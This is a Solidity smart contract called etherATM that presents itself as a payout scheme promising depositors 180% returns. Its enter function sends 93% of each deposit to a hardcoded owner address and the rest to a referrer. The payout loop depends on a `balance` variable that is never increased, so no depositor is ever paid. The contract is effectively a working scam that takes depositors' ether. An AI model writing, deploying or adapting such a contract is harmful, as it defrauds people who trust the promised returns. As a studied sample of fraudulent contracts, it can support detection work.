1 pragma solidity ^0.5.10;
2 
3 contract etherATM {
4     struct Person {
5         address payable etherAddress;
6         uint256 amount;
7         address payable referrer;
8     }
9 
10     Person[] public persons;
11 
12     uint256 public payoutIdx = 0;
13     uint256 public collectedFees;
14     uint256 public balance = 0;
15 
16     address payable owner;
17 
18     modifier onlyowner {
19         if (msg.sender == owner) _;
20     }
21 
22     constructor() public {
23         owner = 0xF51a48488be6AbEFFb56d4B1B666C19F2F66Cf1e;
24     }
25 
26     function enter(address payable referrer) public payable {
27         if (msg.value < 0.05 ether) {
28             msg.sender.transfer(msg.value);
29             return;
30         }
31         uint256 amount;
32         if (msg.value > 4000 ether) {
33             msg.sender.transfer(msg.value - 4000 ether);
34             amount = 4000 ether;
35         } else {
36             amount = msg.value;
37         }
38 
39         uint256 idx = persons.length;
40         persons.length += 1;
41         persons[idx].etherAddress = msg.sender;
42         persons[idx].amount = amount;
43 
44         collectedFees += 0;
45         uint256 totalAmount = collectedFees + amount;
46         uint256 ownerAmount = totalAmount*93/100;
47         totalAmount = totalAmount-ownerAmount;
48         owner.transfer(ownerAmount);
49         referrer.transfer(totalAmount);
50         collectedFees = 0;
51 
52         while (balance > (persons[payoutIdx].amount / 100) * 180) {
53             uint256 transactionAmount = (persons[payoutIdx].amount / 100) * 180;
54             persons[payoutIdx].etherAddress.transfer(transactionAmount);
55             balance -= transactionAmount;
56             payoutIdx += 1;
57         }
58     }
59 
60     function setOwner(address payable _owner) external onlyowner {
61         owner = _owner;
62     }
63 }